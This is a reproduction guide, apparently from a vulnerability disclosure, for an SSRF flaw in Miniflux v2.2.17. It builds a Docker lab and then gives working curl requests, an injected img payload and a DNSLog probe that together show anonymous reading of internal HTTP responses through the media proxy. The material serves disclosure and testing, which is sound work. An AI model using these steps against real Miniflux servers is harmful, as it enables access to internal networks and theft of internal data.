# All Steps to Reproduce the Problem

This document describes a full end-to-end reproduction for the Miniflux `v2.2.17` issue documented in `go-ssrf.txt`.

The reproduction uses Docker to create a reachable internal HTTP service in `100.64.0.0/10`, then shows:

1. `POST /v1/discover` performs a server-side request to that internal target.
2. Imported entry content can be rewritten to a signed public `/proxy/...` URL.
3. Anonymous access to that `/proxy/...` URL returns the internal response body.
4. A loopback control check returns `403`, proving the bug is incomplete non-public IP classification rather than a fully open proxy.

## Tested Version

- Product: Miniflux
- Version: `v2.2.17`
- Validation date: `2026-03-11`

## Prerequisites

- `go`
- `docker`
- `curl`
- `python3`
- `jq`

Optional check:

```bash
go version
docker --version
python3 --version
jq --version
```

## Short Path

If you only need a one-command reproduction, run:

```bash
cd /path/to/miniflux-v2/v2-2.2.17
./scripts/repro_ssrf.sh
```

Cleanup:

```bash
./scripts/repro_ssrf.sh cleanup
```

The rest of this file explains the full manual steps.

## Step 1: Enter the Source Tree

```bash
ROOT=/path/to/miniflux-v2/v2-2.2.17
cd "$ROOT"
```

## Step 2: Define Reproduction Variables

```bash
export NETWORK_NAME=spider-mf-ssrf-net
export DB_CONTAINER=spider-mf-ssrf-db
export APP_CONTAINER=spider-mf-ssrf-app
export TARGET_CONTAINER=spider-mf-ssrf-target

export SUBNET=100.88.88.0/24
export TARGET_IP=100.88.88.10
export TARGET_PORT=18082
export APP_PORT=18083
export BASE_URL="http://127.0.0.1:${APP_PORT}"

export DB_NAME=miniflux2
export DB_USER=postgres
export DB_PASSWORD=postgres

export ADMIN_USERNAME=admin
export ADMIN_PASSWORD=test123

export DISCOVER_URL="http://${TARGET_IP}:${TARGET_PORT}/feed.xml"
export SECRET_URL="http://${TARGET_IP}:${TARGET_PORT}/secret"
export SECRET_MARKER="topsecret-from-${TARGET_IP}"
export WORK_DIR="$ROOT/.tmp_ssrf_repro_manual"
mkdir -p "$WORK_DIR"
```

## Step 3: Build the Linux Miniflux Binary

```bash
GOOS=linux GOARCH="$(go env GOARCH)" CGO_ENABLED=0 \
  go build -buildvcs=false -o "$WORK_DIR/miniflux-linux" .
```

Expected result:

- A binary is created at `$WORK_DIR/miniflux-linux`.

## Step 4: Create an Internal HTTP Target in `100.64.0.0/10`

Create a minimal responder script:

```bash
cat > "$WORK_DIR/target_respond.sh" <<'EOF'
#!/bin/sh

feed='<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>Internal Feed</title>
    <link>http://100.88.88.10:18082/</link>
    <description>SSRF test feed</description>
    <item>
      <title>Hello</title>
      <link>http://100.88.88.10:18082/article</link>
      <guid>hello-1</guid>
    </item>
  </channel>
</rss>
'

IFS= read -r line || exit 0
path=$(printf '%s' "$line" | awk '{print $2}')
cr=$(printf '\r')
while IFS= read -r hdr; do
  [ "$hdr" = "$cr" ] && break
  [ -z "$hdr" ] && break
done

status='200 OK'
ctype='text/plain'
body='topsecret-from-100.88.88.10
'

if [ "$path" = "/feed.xml" ]; then
  ctype='application/rss+xml'
  body=$feed
elif [ "$path" != "/secret" ]; then
  status='404 Not Found'
  body='not found
'
fi

len=$(printf '%s' "$body" | wc -c | tr -d ' ')
printf 'HTTP/1.1 %s\r\nContent-Type: %s\r\nContent-Length: %s\r\nConnection: close\r\n\r\n%s' "$status" "$ctype" "$len" "$body"
EOF

chmod +x "$WORK_DIR/target_respond.sh"
```

This service will return:

- `/feed.xml` -> a valid RSS feed
- `/secret` -> `topsecret-from-100.88.88.10`

## Step 5: Reset Any Existing Reproduction Containers

```bash
docker rm -f "$APP_CONTAINER" "$DB_CONTAINER" "$TARGET_CONTAINER" >/dev/null 2>&1 || true
docker network rm "$NETWORK_NAME" >/dev/null 2>&1 || true
```

## Step 6: Start PostgreSQL and the Internal Target

Create the Docker network:

```bash
docker network create --subnet "$SUBNET" "$NETWORK_NAME"
```

Start PostgreSQL:

```bash
docker run -d \
  --name "$DB_CONTAINER" \
  --network "$NETWORK_NAME" \
  --network-alias db \
  -e POSTGRES_DB="$DB_NAME" \
  -e POSTGRES_USER="$DB_USER" \
  -e POSTGRES_PASSWORD="$DB_PASSWORD" \
  postgres:15-alpine
```

Wait for PostgreSQL:

```bash
until docker exec "$DB_CONTAINER" pg_isready -U "$DB_USER" >/dev/null 2>&1; do
  sleep 1
done
```

Start the internal HTTP target:

```bash
docker run -d \
  --name "$TARGET_CONTAINER" \
  --network "$NETWORK_NAME" \
  --ip "$TARGET_IP" \
  -v "$WORK_DIR/target_respond.sh:/srv/respond.sh:ro" \
  --entrypoint nc \
  busybox:1.37 \
  -lk -p "$TARGET_PORT" -e sh /srv/respond.sh
```

## Step 7: Start Miniflux

```bash
docker run -d \
  --name "$APP_CONTAINER" \
  --network "$NETWORK_NAME" \
  -p "${APP_PORT}:8080" \
  -v "$WORK_DIR/miniflux-linux:/miniflux:ro" \
  --entrypoint /miniflux \
  -e DATABASE_URL="postgres://${DB_USER}:${DB_PASSWORD}@db/${DB_NAME}?sslmode=disable" \
  -e RUN_MIGRATIONS=1 \
  -e CREATE_ADMIN=1 \
  -e ADMIN_USERNAME="$ADMIN_USERNAME" \
  -e ADMIN_PASSWORD="$ADMIN_PASSWORD" \
  -e BASE_URL="$BASE_URL" \
  -e LISTEN_ADDR="0.0.0.0:8080" \
  -e LOG_LEVEL=debug \
  busybox:1.37
```

Wait for healthcheck:

```bash
for _ in $(seq 1 60); do
  if [ "$(curl -s -o /dev/null -w '%{http_code}' "$BASE_URL/healthcheck" || true)" = "200" ]; then
    break
  fi
  sleep 1
done

curl -i "$BASE_URL/healthcheck"
```

Expected result:

- `HTTP/1.1 200 OK`

## Step 8: Reproduce the `/v1/discover` SSRF

```bash
curl -i -u "${ADMIN_USERNAME}:${ADMIN_PASSWORD}" \
  -H 'Content-Type: application/json' \
  -d "{\"url\":\"${DISCOVER_URL}\"}" \
  "${BASE_URL}/v1/discover"
```

Expected result:

- The response includes the internal feed URL.
- Example:

```json
[{"title":"http://100.88.88.10:18082/feed.xml","url":"http://100.88.88.10:18082/feed.xml","type":"rss"}]
```

This proves Miniflux issued a server-side GET to the internal `100.88.88.10` target.

## Step 9: Create a Feed That Uses the Internal RSS URL

Get a category ID:

```bash
CATEGORY_ID=$(curl -s -u "${ADMIN_USERNAME}:${ADMIN_PASSWORD}" \
  "${BASE_URL}/v1/categories" | jq '.[0].id')

echo "$CATEGORY_ID"
```

Create the feed:

```bash
FEED_ID=$(curl -s -u "${ADMIN_USERNAME}:${ADMIN_PASSWORD}" \
  -H 'Content-Type: application/json' \
  -d "{\"feed_url\":\"${DISCOVER_URL}\",\"category_id\":${CATEGORY_ID}}" \
  "${BASE_URL}/v1/feeds" | jq '.feed_id')

echo "$FEED_ID"
```

Expected result:

- `FEED_ID` is a numeric feed identifier.

## Step 10: Import an Entry That References the Internal Secret URL

```bash
ENTRY_ID=$(curl -s -u "${ADMIN_USERNAME}:${ADMIN_PASSWORD}" \
  -H 'Content-Type: application/json' \
  -d "{\"url\":\"https://attacker.example/poc\",\"title\":\"poc\",\"content\":\"<img src=\\\"${SECRET_URL}\\\">\"}" \
  "${BASE_URL}/v1/feeds/${FEED_ID}/entries/import" | jq '.id')

echo "$ENTRY_ID"
```

Expected result:

- `ENTRY_ID` is the imported entry ID.

## Step 11: Extract the Signed Public `/proxy/...` URL

```bash
CONTENT=$(curl -s -u "${ADMIN_USERNAME}:${ADMIN_PASSWORD}" \
  "${BASE_URL}/v1/entries/${ENTRY_ID}" | jq -r '.content')

echo "$CONTENT"

PROXY_URL=$(printf '%s' "$CONTENT" | grep -oE 'https?://[^"]+/proxy/[^"]+' | head -n1)

echo "$PROXY_URL"
```

Expected result:

- The returned entry content contains a signed absolute `/proxy/...` URL.
- The encoded part of that URL corresponds to `http://100.88.88.10:18082/secret`.

## Step 12: Fetch the Proxy URL Anonymously

Do not use credentials here.

```bash
curl -i "$PROXY_URL"
```

Expected result:

```http
HTTP/1.1 200 OK
...

topsecret-from-100.88.88.10
```

This is the core exfiltration result: an anonymous client receives the internal HTTP response body through the public media proxy.

## Step 13: Run a Loopback Control Check

Import an entry that points to loopback:

```bash
LOOPBACK_ENTRY_ID=$(curl -s -u "${ADMIN_USERNAME}:${ADMIN_PASSWORD}" \
  -H 'Content-Type: application/json' \
  -d '{"url":"https://attacker.example/loopback","title":"loopback","content":"<img src=\"http://127.0.0.1:8080/healthcheck\">"}' \
  "${BASE_URL}/v1/feeds/${FEED_ID}/entries/import" | jq '.id')

LOOPBACK_CONTENT=$(curl -s -u "${ADMIN_USERNAME}:${ADMIN_PASSWORD}" \
  "${BASE_URL}/v1/entries/${LOOPBACK_ENTRY_ID}" | jq -r '.content')

LOOPBACK_PROXY_URL=$(printf '%s' "$LOOPBACK_CONTENT" | grep -oE 'https?://[^"]+/proxy/[^"]+' | head -n1)

curl -i "$LOOPBACK_PROXY_URL"
```

Expected result:

- The response status is `403 Forbidden`.

This confirms:

- loopback is blocked
- `100.64.0.0/10` is not blocked
- the problem is incomplete non-public IP classification

## Step 14: Optional DNSLog Trigger for `/v1/discover`

If you only want to confirm the outbound request behavior with your own DNSLog endpoint:

```bash
curl -i -u "${ADMIN_USERNAME}:${ADMIN_PASSWORD}" \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://REPLACE-WITH-YOUR-DNSLOG-DOMAIN/poc"}' \
  "${BASE_URL}/v1/discover"
```

Replace:

- `REPLACE-WITH-YOUR-DNSLOG-DOMAIN`

Observation:

- Even if the API returns an error, your DNSLog platform may still record the outbound request.

## Step 15: Cleanup

```bash
docker rm -f "$APP_CONTAINER" "$DB_CONTAINER" "$TARGET_CONTAINER"
docker network rm "$NETWORK_NAME"
rm -rf "$WORK_DIR"
```

## Success Criteria

The issue is reproduced if all of the following are true:

1. `POST /v1/discover` returns a discovered feed for `http://100.88.88.10:18082/feed.xml`.
2. An imported entry containing `<img src="http://100.88.88.10:18082/secret">` is rewritten to a signed `/proxy/...` URL.
3. Anonymous access to that `/proxy/...` URL returns `topsecret-from-100.88.88.10`.
4. The loopback control check returns `403 Forbidden`.
